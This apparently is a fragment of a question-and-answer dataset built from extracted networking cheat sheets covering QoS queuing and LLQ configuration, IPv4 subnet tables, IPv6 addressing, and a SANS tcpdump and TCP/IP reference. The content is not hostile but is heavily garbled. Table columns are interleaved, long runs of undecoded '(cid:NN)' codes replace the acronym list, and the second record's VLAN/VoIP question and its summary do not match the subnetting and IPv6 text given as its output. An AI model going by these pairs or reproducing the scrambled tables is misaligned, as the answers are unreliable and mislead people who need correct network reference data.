    "summary": "FIFO is the default queuing method on interfaces over 2 Mbps and provides first-in-first-out processing without prioritization. PQ, CQ, WFQ, and CBWFQ are different queuing methods with varying features like priority, bandwidth allocation, and support for delay-sensitive traffic. LLQ is a modern implementation that ensures low latency and is highly configurable for priority and bandwidth management.",
    "output": "FIFO PQ CQ WFQ CBWFQ LLQ\nDefault on Interfaces >2 Mbps No No <=2 Mbps No No\nNumber of Queues 1 4 Configured Dynamic Configured Configured\nConfigurable Classes No Yes Yes No Yes Yes\nBandwidth Allocation Automatic Automatic Configured Automatic Configured Configured\nProvides for Minimal Delay No Yes No No No Yes\nModern Implementation Yes No No No Yes Yes\nFirst In First Out (FIFO) Priority Queuing (PQ) LLQ Config Example\nHigh Class Definitions\n! Match packets by DSCP value\nTx\nRing Medium class-map match-all Voice\nmatch dscp ef\nNormal !\nHardware\nHardware Queue class-map match-all Call-Signaling\nQueue\nLow match dscp cs3\n· Packets are transmitted in the !\norder they are processed · Provides four static queues which class-map match-any Critical-Apps\nmatch dscp af21 af22\n· No prioritization is provided cannot be reconfigured\n!\n· Default queuing method on high- · Higher-priority queues are ! Match packets by access list\nspeed (>2 Mbps) interfaces always emptied before lower- class-map match-all Scavenger\npriority queues match access-group name Other\n· Configurable with the tx-ring-\nlimit interface config command · Lower-priority queues are at risk\nof bandwidth starvation policy-map Foo Policy Creation\nCustom Queuing (CQ) class Voice\nWeighted Fair Queuing (WFQ) ! Priority queue policed to 33%\nQueue A 500 B/cycle priority percent 33\nFlow 1 class Call-Signaling\nQueue B 4500 B/cycle ! Allocate 5% of bandwidth\nHardware Flow 2 bandwidth percent 5\nQueue C 1500 B/cycle Queue ... class Critical-Apps\nHardware bandwidth percent 20\n· Rotates through queues using Flow n Queue ! Extend queue size to 96 packets\nWeighted Round Robin (WRR) queue-limit 96\n· Queues are dynamically created class Scavenger\n· Processes a configurable number\nper flow to ensure fair processing ! Police to 64 kbps\nof bytes from each queue per turn\npolice cir 64000\n· Statistically drops packets from\n· Prevents queue starvation but conform-action transmit\naggressive flows more often\ndoes not provide for delay- exceed-action drop\n· No support for delay-sensitive class class-default\nsensitive traffic\ntraffic ! Enable WFQ\nfair-queue\nClass-Based WFQ (CBWFQ)\nLow Latency Queuing (LLQ) ! Enable WRED\nrandom-detect\nQueue A 512 Kbps Min\nPriority 512 Kbps Max\ninterface Serial0 Policy Application\nQueue B 1024 Kbps Min\nQueue A 512 Kbps Min ! Apply the policy in or out\nHardware service-policy output Foo\nDefault Remainder\nQueue Queue B 1024 Kbps Min\n· WFQ with administratively Hardware LLQ Config Example\nDefault Remainder\nQueue\nconfigured queues\nshow policy-map [interface]\n· Each queue is allocated an · CBWFQ with the addition of a\nShow interface\namount/percentage of bandwidth policed strict-priority queue\n· No support for delay-sensitive · Highly configurable while still show queue <interface>\ntraffic supporting delay-sensitive traffic\nShow mls qos\nby Jeremy Stretch v2.0\n\nIP 4 S"
  },
  {
    "input": "What are the key concepts and terminology related to VLANs, trunking, and VoIP in network configuration and management?",
    "summary": "The text provides information on IP addressing, subnetting, and VLAN configurations. It explains CIDR notation, subnet masks, and how to convert between decimal and binary representations. It also covers VLAN types, trunking, and configuration commands for switches. Additionally, it includes details about VoIP and PoE, including different power standards and their usage.",
    "output": "V UBNETTING\npacketlife.net\nSubnets Decimal to Binary\nCIDR Subnet Mask Addresses Wildcard Subnet Mask Wildcard\n/32 255.255.255.255 1 0.0.0.0 255 1111 1111 0 0000 0000\n/31 255.255.255.254 2 0.0.0.1 254 1111 1110 1 0000 0001\n/30 255.255.255.252 4 0.0.0.3 252 1111 1100 3 0000 0011\n/29 255.255.255.248 8 0.0.0.7 248 1111 1000 7 0000 0111\n/28 255.255.255.240 16 0.0.0.15 240 1111 0000 15 0000 1111\n/27 255.255.255.224 32 0.0.0.31 224 1110 0000 31 0001 1111\n/26 255.255.255.192 64 0.0.0.63 192 1100 0000 63 0011 1111\n/25 255.255.255.128 128 0.0.0.127 128 1000 0000 127 0111 1111\n/24 255.255.255.0 256 0.0.0.255 0 0000 0000 255 1111 1111\n/23 255.255.254.0 512 0.0.1.255\nSubnet Proportion\n/22 255.255.252.0 1,024 0.0.3.255\n/21 255.255.248.0 2,048 0.0.7.255\n/20 255.255.240.0 4,096 0.0.15.255\n/27\n/19 255.255.224.0 8,192 0.0.31.255 /26 /28\n/29\n/18 255.255.192.0 16,384 0.0.63.255\n/30\n/17 255.255.128.0 32,768 0.0.127.255\n/30\n/16 255.255.0.0 65,536 0.0.255.255\n/15 255.254.0.0 131,072 0.1.255.255\n/14 255.252.0.0 262,144 0.3.255.255\n/25\n/13 255.248.0.0 524,288 0.7.255.255\n/12 255.240.0.0 1,048,576 0.15.255.255\n/11 255.224.0.0 2,097,152 0.31.255.255\nClassful Ranges\n/10 255.192.0.0 4,194,304 0.63.255.255\nA 0.0.0.0 – 127.255.255.255\n/9 255.128.0.0 8,388,608 0.127.255.255\n\nB 128.0.0.0 - 191.255.255.255\n/8 255.0.0.0 16,777,216 0.255.255.255\n\nC 192.0.0.0 - 223.255.255.255\n/7 254.0.0.0 33,554,432 1.255.255.255\n\nD 224.0.0.0 - 239.255.255.255\n/6 252.0.0.0 67,108,864 3.255.255.255\n\nE 240.0.0.0 - 255.255.255.255\n/5 248.0.0.0 134,217,728 7.255.255.255\n/4 240.0.0.0 268,435,456 15.255.255.255 Reserved Ranges\n/3 224.0.0.0 536,870,912 31.255.255.255 RFC 1918 10.0.0.0 - 10.255.255.255\n/2 192.0.0.0 1,073,741,824 63.255.255.255 Localhost 127.0.0.0 - 127.255.255.255\n/1 128.0.0.0 2,147,483,648 127.255.255.255 RFC 1918 172.16.0.0 - 172.31.255.255\n/0 0.0.0.0 4,294,967,296 255.255.255.255 RFC 1918 192.168.0.0 - 192.168.255.255\nTerminology\n\nCIDR VLSM\nClassless interdomain routing was developed to Variable-length subnet masks are an arbitrary length\nprovide more granularity than legacy classful between 0 and 32 bits; CIDR relies on VLSMs to define\naddressing; CIDR notation is expressed as /XX routes\nby Jeremy Stretch v2.0\n\nIP 6\nV\npacketlife.net\nProtocol Header Address Notation\n8 16 24 32\nVer Traffic Class Flow Label\nPayload Length Next Header Hop Limit\nAddress Formats\nSource Address\nGlobal unicast\nGlobal Prefix Subnet Interface ID\nDestination Address\n48 16 64\nLink-local unicast\nVersion (4 bits) · Always set to 6\nInterface ID\nTraffic Class (8 bits) · A DSCP value for QoS\n64 64\nFlow Label (20 bits) · Identifies unique flows (optional)\nMulticast\nPayload Length (16 bits) · Length of the payload in bytes\nGroup ID\nNext Header (8 bits) · Header or protocol which follows\nHop Limit (8 bits) · Similar to IPv4's time to live field\nEUI-64 Formation\nSource Address (128 bits) · Source IP address\nDestination Address (128 bits) · Destination IP address MAC\nAddress Types\n\nEUI-64\nUnicast · One-to-one communication\nMulticast · One-to-many communication · Insert 0xfffe between the two halves of the MAC\nAnycast · An address configured in multiple locations · Flip the seventh bit (universal/local flag) to 1\nMulticast Scopes Extension Headers\n1 Interface-local 5 Site-local Hop-by-hop Options (0)\nCarries additional information which must be examined by every\n2 Link-local 8 Org-local\nrouter in the path\n4 Admin-local E Global Routing (43)\nProvides source routing functionality\nSpecial-Use Ranges\nFragment (44)\n::/0 Default route Included when a packet has been fragmented by its source\n::/128 Unspecified Encapsulating Security Payload (50)\nProvides payload encryption (IPsec)\n::1/128 Loopback\nAuthentication Header (51)\n::/96 IPv4-compatible* Provides packet authentication (IPsec)\n::FFFF:0:0/96 IPv4-mapped Destination Options (60)\nCarries additional information which pertains only to the recipient\n2001::/32 Teredo\nTransition Mechanisms\n2001:DB8::/32 Documentation\nDual Stack\n2002::/16 6to4\nTransporting IPv4 and IPv6 across an infrastructure simultaneously\nFC00::/7 Unique local\nTunneling\nFE80::/10 Link-local unicast IPv6 traffic is encapsulated into IPv4 using IPv6-in-IP, UDP (Teredo),\nor Intra-Site Automatic Tunnel Addressing Protocol (ISATAP)\nFEC0::/10 Site-local unicast*\nTranslation\nFF00::/8 Multicast Stateless IP/ICMP Translation (SIIT) translates IP header fields, NAT\n* Deprecated Protocol Translation (NAT-PT) maps between IPv6 and IPv4 addresses\nby Jeremy Stretch v2.0\nsgalF epocS\n· Eliminate leading zeros from all two-byte sets\n· Replace up to one string of consecutive zeros\nwith a double-colon (::)\n8 4 4 112\nUDPHeader tcpdump Usage\nBit Number\ntcpdump [-aenStvx] [-F file]\n1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3 [-i int] [-r file] [-s snaplen]\n0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 [-w file] ['filter_expression']\nSource Port Destination Port -e Display data link header. -F Filter expression in file. Length Checksum\n-i Listen on int interface. TCP/IP and tcpdump -n Don't resolve IP addresses. UDP Header Information -r Read packets from file. Common UDP Well-Known Server Ports Version July-2010 -s Get snaplen bytes from each packet. 7 echo 138 netbios-dgm -S Use absolute TCP sequence numbers. 19 chargen 161 snmp P O C K E T R E F E R E N C E G U I D E -t Don't print timestamp. 37 time 162 snmp-trap -v Verbose mode. 53 domain 500 isakmp\n-w Write packets to file. 67 bootps (DHCP) 514 syslog\nISC@sans.org • www.sans.org • http://isc.sans.org -x Display in hex. 68 bootpc (DHCP) 520 rip\n69 tftp 33434 traceroute -X Display in hex and ASCII. The SANS Technology Institute (STI)\n137 netbios-ns\nLength offers two degree programs: Acronyms\n(Number of bytes in entire datagram including header; COURSES & GIAC CERTIFICATIONS\nminimum value = 8)\nMS in Information Security Management (cid:34)(cid:41) (cid:34)(cid:86)(cid:85)(cid:73)(cid:70)(cid:79)(cid:85)(cid:74)(cid:68)(cid:66)(cid:85)(cid:74)(cid:80)(cid:79)(cid:1)(cid:41)(cid:70)(cid:66)(cid:69)(cid:70)(cid:83)(cid:1)(cid:9)(cid:51)(cid:39)(cid:36)(cid:1)(cid:19)(cid:21)(cid:17)(cid:19)(cid:10)\nChecksum FOR558 (cid:34)(cid:51)(cid:49) (cid:34)(cid:69)(cid:69)(cid:83)(cid:70)(cid:84)(cid:84)(cid:1)(cid:51)(cid:70)(cid:84)(cid:80)(cid:77)(cid:86)(cid:85)(cid:74)(cid:80)(cid:79)(cid:1)(cid:49)(cid:83)(cid:80)(cid:85)(cid:80)(cid:68)(cid:80)(cid:77)(cid:1)(cid:9)(cid:51)(cid:39)(cid:36)(cid:1)(cid:25)(cid:19)(cid:23)(cid:10)\n(Covers pseudo-header and entire UDP datagram) and Network Forensics (cid:35)(cid:40)(cid:49) (cid:35)(cid:80)(cid:83)(cid:69)(cid:70)(cid:83)(cid:1)(cid:40)(cid:66)(cid:85)(cid:70)(cid:88)(cid:66)(cid:90)(cid:1)(cid:49)(cid:83)(cid:80)(cid:85)(cid:80)(cid:68)(cid:80)(cid:77)(cid:1)(cid:9)(cid:51)(cid:39)(cid:36)(cid:1)(cid:18)(cid:24)(cid:24)(cid:18)(cid:10)\n(cid:36)(cid:56)(cid:51) (cid:36)(cid:80)(cid:79)(cid:72)(cid:70)(cid:84)(cid:85)(cid:74)(cid:80)(cid:79)(cid:1)(cid:56)(cid:74)(cid:79)(cid:69)(cid:80)(cid:88)(cid:1)(cid:51)(cid:70)(cid:69)(cid:86)(cid:68)(cid:70)(cid:69)(cid:1)(cid:9)(cid:51)(cid:39)(cid:36)(cid:1)(cid:19)(cid:21)(cid:25)(cid:18)(cid:10)\n(cid:37)(cid:39) (cid:37)(cid:80)(cid:79)(cid:8)(cid:85)(cid:1)(cid:39)(cid:83)(cid:66)(cid:72)(cid:78)(cid:70)(cid:79)(cid:85)(cid:1)(cid:67)(cid:74)(cid:85)(cid:1)(cid:9)(cid:42)(cid:49)(cid:10)\nMS in Information Security Engineering.\n\nARP MGT512 (cid:37)(cid:41)(cid:36)(cid:49) (cid:37)(cid:90)(cid:79)(cid:66)(cid:78)(cid:74)(cid:68)(cid:1)(cid:41)(cid:80)(cid:84)(cid:85)(cid:1)(cid:36)(cid:80)(cid:79)(cid:71)(cid:74)(cid:72)(cid:86)(cid:83)(cid:66)(cid:85)(cid:74)(cid:80)(cid:79)(cid:1)(cid:49)(cid:83)(cid:80)(cid:85)(cid:80)(cid:68)(cid:80)(cid:77)(cid:1)(cid:9)(cid:51)(cid:39)(cid:36)(cid:1)(cid:19)(cid:18)(cid:20)(cid:18)(cid:10)\n(cid:37)(cid:47)(cid:52) (cid:37)(cid:80)(cid:78)(cid:66)(cid:74)(cid:79)(cid:1)(cid:47)(cid:66)(cid:78)(cid:70)(cid:1)(cid:52)(cid:90)(cid:84)(cid:85)(cid:70)(cid:78)(cid:1)(cid:9)(cid:51)(cid:39)(cid:36)(cid:1)(cid:18)(cid:17)(cid:20)(cid:22)(cid:10)\nSANS Security Leadership Essentials For\nBit Number (cid:38)(cid:36)(cid:47) (cid:38)(cid:89)(cid:81)(cid:77)(cid:74)(cid:68)(cid:74)(cid:85)(cid:1)(cid:36)(cid:80)(cid:79)(cid:72)(cid:70)(cid:84)(cid:85)(cid:74)(cid:80)(cid:79)(cid:1)(cid:47)(cid:80)(cid:85)(cid:74)(cid:71)(cid:74)(cid:68)(cid:66)(cid:85)(cid:74)(cid:80)(cid:79)(cid:1)(cid:9)(cid:51)(cid:39)(cid:36)(cid:1)(cid:20)(cid:18)(cid:23)(cid:25)(cid:10)\nManagers with Knowledge Compression™ (cid:38)(cid:42)(cid:40)(cid:51)(cid:49) (cid:38)(cid:89)(cid:85)(cid:70)(cid:79)(cid:69)(cid:70)(cid:69)(cid:1)(cid:42)(cid:40)(cid:51)(cid:49)(cid:1)(cid:9)(cid:36)(cid:74)(cid:84)(cid:68)(cid:80)(cid:10)\n1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3\n0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 If you have a bachelor’s degree and 12 months GSLC (cid:38) (cid:39)(cid:53) (cid:52) (cid:49) (cid:49) (cid:38) (cid:39)(cid:74) (cid:79) (cid:77)(cid:70) (cid:68) (cid:1) (cid:66) (cid:53) (cid:81) (cid:83)(cid:66) (cid:84) (cid:79) (cid:86) (cid:84) (cid:77)(cid:66) (cid:71)(cid:70) (cid:85)(cid:74) (cid:83) (cid:79) (cid:1)(cid:49) (cid:72) (cid:83) (cid:1) (cid:80) (cid:52) (cid:85) (cid:70) (cid:80) (cid:68) (cid:68) (cid:86) (cid:80) (cid:83)(cid:74) (cid:77) (cid:85) (cid:1)(cid:9) (cid:90) (cid:51) (cid:1)(cid:49) (cid:39)(cid:36) (cid:66)(cid:90) (cid:1)(cid:26) (cid:77)(cid:80) (cid:22) (cid:66) (cid:26) (cid:69) (cid:10) (cid:1)(cid:9)(cid:51)(cid:39)(cid:36)(cid:1)(cid:19)(cid:21)(cid:17)(cid:23)(cid:10)\nHardware Address Type Protocol Address Type of experience in information security, follow (cid:40)(cid:51)(cid:38) (cid:40)(cid:70)(cid:79)(cid:70)(cid:83)(cid:74)(cid:68)(cid:1)(cid:51)(cid:80)(cid:86)(cid:85)(cid:74)(cid:79)(cid:72)(cid:1)(cid:38)(cid:79)(cid:68)(cid:66)(cid:81)(cid:84)(cid:86)(cid:77)(cid:66)(cid:85)(cid:74)(cid:80)(cid:79)(cid:1)(cid:9)(cid:51)(cid:39)(cid:36)(cid:1)(cid:19)(cid:24)(cid:25)(cid:21)(cid:10)\nSEC401 (cid:41)(cid:53)(cid:53)(cid:49) (cid:41)(cid:90)(cid:81)(cid:70)(cid:83)(cid:85)(cid:70)(cid:89)(cid:85)(cid:1)(cid:53)(cid:83)(cid:66)(cid:79)(cid:84)(cid:71)(cid:70)(cid:83)(cid:1)(cid:49)(cid:83)(cid:80)(cid:85)(cid:80)(cid:68)(cid:80)(cid:77)(cid:1)(cid:9)(cid:51)(cid:39)(cid:36)(cid:1)(cid:18)(cid:26)(cid:21)(cid:22)(cid:10)\nH/w Addr Len Prot.\n\nAddr Len Operation these easy steps to get started: SANS Security Essentials Bootcamp Style (cid:42)(cid:36)(cid:46)(cid:49) (cid:42)(cid:79)(cid:85)(cid:70)(cid:83)(cid:79)(cid:70)(cid:85)(cid:1)(cid:36)(cid:80)(cid:79)(cid:85)(cid:83)(cid:80)(cid:77)(cid:1)(cid:46)(cid:70)(cid:84)(cid:84)(cid:66)(cid:72)(cid:70)(cid:1)(cid:49)(cid:83)(cid:80)(cid:85)(cid:80)(cid:68)(cid:80)(cid:77)(cid:1)(cid:1)(cid:9)(cid:51)(cid:39)(cid:36)(cid:1)(cid:24)(cid:26)(cid:19)(cid:10)\n(cid:42)(cid:40)(cid:46)(cid:49) (cid:42)(cid:79)(cid:85)(cid:70)(cid:83)(cid:79)(cid:70)(cid:85)(cid:1)(cid:40)(cid:83)(cid:80)(cid:86)(cid:81)(cid:1)(cid:46)(cid:66)(cid:79)(cid:66)(cid:72)(cid:70)(cid:78)(cid:70)(cid:79)(cid:85)(cid:1)(cid:49)(cid:83)(cid:80)(cid:85)(cid:80)(cid:68)(cid:80)(cid:77)(cid:1)(cid:9)(cid:51)(cid:39)(cid:36)(cid:1)(cid:19)(cid:19)(cid:20)(cid:23)(cid:10)\nSource Hardware Address GSEC (cid:42)(cid:40)(cid:51)(cid:49) (cid:42)(cid:79)(cid:85)(cid:70)(cid:83)(cid:74)(cid:80)(cid:83)(cid:1)(cid:40)(cid:66)(cid:85)(cid:70)(cid:88)(cid:66)(cid:90)(cid:1)(cid:51)(cid:80)(cid:86)(cid:85)(cid:74)(cid:79)(cid:72)(cid:1)(cid:49)(cid:83)(cid:80)(cid:85)(cid:80)(cid:68)(cid:80)(cid:77)(cid:1)(cid:9)(cid:36)(cid:74)(cid:84)(cid:68)(cid:80)(cid:10)\nSource Hardware Addr (cont.) Source Protocol Address • Complete an application – downloadable at (cid:42)(cid:46)(cid:34)(cid:49) (cid:42)(cid:79)(cid:85)(cid:70)(cid:83)(cid:79)(cid:70)(cid:85)(cid:1)(cid:46)(cid:70)(cid:84)(cid:84)(cid:66)(cid:72)(cid:70)(cid:1)(cid:34)(cid:68)(cid:68)(cid:70)(cid:84)(cid:84)(cid:1)(cid:49)(cid:83)(cid:80)(cid:85)(cid:80)(cid:68)(cid:80)(cid:77)(cid:1)(cid:9)(cid:51)(cid:39)(cid:36)(cid:1)(cid:19)(cid:17)(cid:23)(cid:17)(cid:10)\n(cid:42)(cid:49) (cid:42)(cid:79)(cid:85)(cid:70)(cid:83)(cid:79)(cid:70)(cid:85)(cid:1)(cid:49)(cid:83)(cid:80)(cid:85)(cid:80)(cid:68)(cid:80)(cid:77)(cid:1)(cid:9)(cid:51)(cid:39)(cid:36)(cid:1)(cid:24)(cid:26)(cid:18)(cid:10)\nwww.sans.edu/admissions/procedure.php SEC502\nSource Protocol Addr (cont.) Target Hardware Address (cid:42)(cid:52)(cid:34)(cid:44)(cid:46)(cid:49)(cid:1) (cid:42)(cid:79)(cid:85)(cid:70)(cid:83)(cid:79)(cid:70)(cid:85)(cid:1)(cid:52)(cid:70)(cid:68)(cid:86)(cid:83)(cid:74)(cid:85)(cid:90)(cid:1)(cid:34)(cid:84)(cid:84)(cid:80)(cid:68)(cid:74)(cid:66)(cid:85)(cid:74)(cid:80)(cid:79)(cid:1)(cid:7)(cid:1)(cid:44)(cid:70)(cid:90)(cid:1)(cid:46)(cid:66)(cid:79)(cid:66)(cid:72)(cid:70)(cid:78)(cid:70)(cid:79)(cid:85)(cid:1)(cid:49)(cid:83)(cid:80)(cid:85)(cid:80)(cid:68)(cid:80)(cid:77)(cid:1)\nPerimeter Protection In-Depth\n(cid:9)(cid:51)(cid:39)(cid:36)(cid:1)(cid:19)(cid:21)(cid:17)(cid:25)(cid:10)\nTarget Hardware Address (cont.)\n• Submit the employer recommendation – form is GCFW (cid:45)(cid:19)(cid:53)(cid:49) (cid:45)(cid:66)(cid:90)(cid:70)(cid:83)(cid:1)(cid:19)(cid:1)(cid:53)(cid:86)(cid:79)(cid:79)(cid:70)(cid:77)(cid:74)(cid:79)(cid:72)(cid:1)(cid:49)(cid:83)(cid:80)(cid:85)(cid:80)(cid:68)(cid:80)(cid:77)(cid:1)(cid:9)(cid:51)(cid:39)(cid:36)(cid:1)(cid:19)(cid:23)(cid:23)(cid:18)(cid:10)\nTarget Protocol Address (cid:47)(cid:47)(cid:53)(cid:49) (cid:47)(cid:70)(cid:85)(cid:88)(cid:80)(cid:83)(cid:76)(cid:1)(cid:47)(cid:70)(cid:88)(cid:84)(cid:1)(cid:53)(cid:83)(cid:66)(cid:79)(cid:84)(cid:71)(cid:70)(cid:83)(cid:1)(cid:49)(cid:83)(cid:80)(cid:85)(cid:80)(cid:68)(cid:80)(cid:77)(cid:1)(cid:9)(cid:51)(cid:39)(cid:36)(cid:1)(cid:26)(cid:24)(cid:24)(cid:10)\nprovided\n(cid:48)(cid:52)(cid:49)(cid:39) (cid:48)(cid:81)(cid:70)(cid:79)(cid:1)(cid:52)(cid:73)(cid:80)(cid:83)(cid:85)(cid:70)(cid:84)(cid:85)(cid:1)(cid:49)(cid:66)(cid:85)(cid:73)(cid:1)(cid:39)(cid:74)(cid:83)(cid:84)(cid:85)(cid:1)(cid:9)(cid:51)(cid:39)(cid:36)(cid:1)(cid:18)(cid:22)(cid:25)(cid:20)(cid:10)\nARP Parameters (for Ethernet and IPv4) SEC503 (cid:49)(cid:48)(cid:49)(cid:20) (cid:49)(cid:80)(cid:84)(cid:85)(cid:1)(cid:48)(cid:71)(cid:71)(cid:74)(cid:68)(cid:70)(cid:1)(cid:49)(cid:83)(cid:80)(cid:85)(cid:80)(cid:68)(cid:80)(cid:77)(cid:1)(cid:87)(cid:20)(cid:1)(cid:9)(cid:51)(cid:39)(cid:36)(cid:1)(cid:18)(cid:21)(cid:23)(cid:17)(cid:10)\nIntrusion Detection In-Depth (cid:51)(cid:39)(cid:36) (cid:51)(cid:70)(cid:82)(cid:86)(cid:70)(cid:84)(cid:85)(cid:1)(cid:71)(cid:80)(cid:83)(cid:1)(cid:36)(cid:80)(cid:78)(cid:78)(cid:70)(cid:79)(cid:85)(cid:84)\nHardware Address Type • Have your college send sealed transcripts to STI\n(cid:51)(cid:42)(cid:49) (cid:51)(cid:80)(cid:86)(cid:85)(cid:74)(cid:79)(cid:72)(cid:1)(cid:42)(cid:79)(cid:71)(cid:80)(cid:83)(cid:78)(cid:66)(cid:85)(cid:74)(cid:80)(cid:79)(cid:1)(cid:49)(cid:83)(cid:80)(cid:85)(cid:80)(cid:68)(cid:80)(cid:77)(cid:1)(cid:9)(cid:51)(cid:39)(cid:36)(cid:1)(cid:19)(cid:21)(cid:22)(cid:20)(cid:10)\n1 Ethernet GCIA\n(cid:45)(cid:37)(cid:34)(cid:49) (cid:45)(cid:74)(cid:72)(cid:73)(cid:85)(cid:88)(cid:70)(cid:74)(cid:72)(cid:73)(cid:85)(cid:1)(cid:37)(cid:74)(cid:83)(cid:70)(cid:68)(cid:85)(cid:80)(cid:83)(cid:90)(cid:1)(cid:34)(cid:68)(cid:68)(cid:70)(cid:84)(cid:84)(cid:1)(cid:49)(cid:83)(cid:80)(cid:85)(cid:80)(cid:68)(cid:80)(cid:77)(cid:1)(cid:9)(cid:51)(cid:39)(cid:36)(cid:1)(cid:19)(cid:19)(cid:22)(cid:18)(cid:10)\n6 IEEE 802 LAN\n• Submit an application fee (cid:52)(cid:44)(cid:42)(cid:49) (cid:52)(cid:74)(cid:78)(cid:81)(cid:77)(cid:70)(cid:1)(cid:44)(cid:\n\n70)(cid:90)(cid:14)(cid:46)(cid:66)(cid:79)(cid:66)(cid:72)(cid:70)(cid:78)(cid:70)(cid:79)(cid:85)(cid:1)(cid:71)(cid:80)(cid:83)(cid:1)(cid:42)(cid:79)(cid:85)(cid:70)(cid:83)(cid:79)(cid:70)(cid:85)(cid:1)(cid:49)(cid:83)(cid:80)(cid:85)(cid:80)(cid:68)(cid:80)(cid:77)(cid:84)\nProtocol Address Type SEC556 (cid:52)(cid:46)(cid:53)(cid:49) (cid:52)(cid:74)(cid:78)(cid:81)(cid:77)(cid:70)(cid:1)(cid:46)(cid:66)(cid:74)(cid:77)(cid:1)(cid:53)(cid:83)(cid:66)(cid:79)(cid:84)(cid:71)(cid:70)(cid:83)(cid:1)(cid:49)(cid:83)(cid:80)(cid:85)(cid:80)(cid:68)(cid:80)(cid:77)(cid:1)(cid:9)(cid:51)(cid:39)(cid:36)(cid:1)(cid:25)(cid:19)(cid:18)(cid:10)\n2048 IPv4 (0x0800)\n(cid:52)(cid:47)(cid:46)(cid:49) (cid:52)(cid:74)(cid:78)(cid:81)(cid:77)(cid:70)(cid:1)(cid:47)(cid:70)(cid:85)(cid:88)(cid:80)(cid:83)(cid:76)(cid:1)(cid:46)(cid:66)(cid:79)(cid:66)(cid:72)(cid:70)(cid:78)(cid:70)(cid:79)(cid:85)(cid:1)(cid:49)(cid:83)(cid:80)(cid:85)(cid:80)(cid:68)(cid:80)(cid:77)(cid:1)(cid:9)(cid:51)(cid:39)(cid:36)(cid:1)(cid:18)(cid:18)(cid:22)(cid:24)(cid:10)\nComprehensive Packet Analysis\nHardware Address Length (cid:52)(cid:52)(cid:41) (cid:52)(cid:70)(cid:68)(cid:86)(cid:83)(cid:70)(cid:1)(cid:52)(cid:73)(cid:70)(cid:77)(cid:77)\n6 for Ethernet/IEEE 802 (cid:52)(cid:52)(cid:45) (cid:52)(cid:70)(cid:68)(cid:86)(cid:83)(cid:70)(cid:1)(cid:52)(cid:80)(cid:68)(cid:76)(cid:70)(cid:85)(cid:84)(cid:1)(cid:45)(cid:66)(cid:90)(cid:70)(cid:83)(cid:1)(cid:9)(cid:47)(cid:70)(cid:85)(cid:84)(cid:68)(cid:66)(cid:81)(cid:70)(cid:10)\nProtocol Address Length Learn more at www.sans.edu SEC560 (cid:53)(cid:36)(cid:49) (cid:53)(cid:83)(cid:66)(cid:79)(cid:84)(cid:78)(cid:74)(cid:84)(cid:84)(cid:74)(cid:80)(cid:79)(cid:1)(cid:36)(cid:80)(cid:79)(cid:85)(cid:83)(cid:80)(cid:77)(cid:1)(cid:49)(cid:83)(cid:80)(cid:85)(cid:80)(cid:68)(cid:80)(cid:77)(cid:1)(cid:9)(cid:51)(cid:39)(cid:36)(cid:1)(cid:24)(cid:26)(cid:20)(cid:10)\n4 for IPv4 Network Penetration Testing & Ethical Hacking (cid:53)(cid:39)(cid:53)(cid:49) (cid:53)(cid:83)(cid:74)(cid:87)(cid:74)(cid:66)(cid:77)(cid:1)(cid:39)(cid:74)(cid:77)(cid:70)(cid:1)(cid:53)(cid:83)(cid:66)(cid:79)(cid:84)(cid:71)(cid:70)(cid:83)(cid:1)(cid:49)(cid:83)(cid:80)(cid:85)(cid:80)(cid:68)(cid:80)(cid:77)(cid:1)(cid:9)(cid:51)(cid:39)(cid:36)(cid:1)(cid:18)(cid:20)(cid:22)(cid:17)(cid:10)\n(cid:53)(cid:48)(cid:52) (cid:53)(cid:90)(cid:81)(cid:70)(cid:1)(cid:80)(cid:71)(cid:1)(cid:52)(cid:70)(cid:83)(cid:87)(cid:74)(cid:68)(cid:70)(cid:1)(cid:71)(cid:74)(cid:70)(cid:77)(cid:69)(cid:1)(cid:9)(cid:42)(cid:49)(cid:10)\nOperation Contact us at\nGPEN (cid:54)(cid:37)(cid:49) (cid:54)(cid:84)(cid:70)(cid:83)(cid:1)(cid:37)(cid:66)(cid:85)(cid:66)(cid:72)(cid:83)(cid:66)(cid:78)(cid:1)(cid:49)(cid:83)(cid:80)(cid:85)(cid:80)(cid:68)(cid:80)(cid:77)(cid:1)(cid:9)(cid:51)(cid:39)(cid:36)(cid:1)(cid:24)(cid:23)(cid:25)(cid:10)\n1 Request\n2 Reply info@sans.edu or (720) 941-4932 All RFCs can be found at http://www.rfc-editor.org\nDNS ICMP IPHeader TCPHeader\nBit Number Bit Number Bit Number\nBit Number\n1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3 1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3\n1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3\n0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\nLENGTH (TCPONLY) Type Code Checksum Version IHL Type of Service Total Length Source Port Destination Port\nID.\n\nOther message-specific information... Identification Flags Fragment Offset Sequence Number\nQR Opcode AA TC RD RA Z RCODE Time to Live Protocol Header Checksum Acknowledgment Number\nType Name/Codes (Code=0 unless otherwise specified)\nOffset\nQDCOUNT 0 Echo Reply Source Address (Header Length) Reserved Flags Window\nANCOUNT 3 Destination Unreachable Destination Address Checksum Urgent Pointer\n0 Net Unreachable\nNSCOUNT 1 Host Unreachable Options (optional) Options (optional)\n2 Protocol Unreachable\nARCOUNT 3 Port Unreachable IP Header Contents TCP Header Contents\n4 Fragmentation Needed & DF Set\nQuestion Section Common TCP Well-Known Server Ports\n5 Source Route Failed Version\n7 echo 110 pop3\nAnswer Section 6 Destination Network Unknown 4 IP version 4\n19 chargen 111 sunrpc\n7 Destination Host Unknown\nInternet Header Length 20 ftp-data 119 nntp\nAuthority Section 8 Source Host Isolated\nNumber of 32-bit words in IP header; minimum 21 ftp-control 139 netbios-ssn\nAdditional Information Section 9 Network 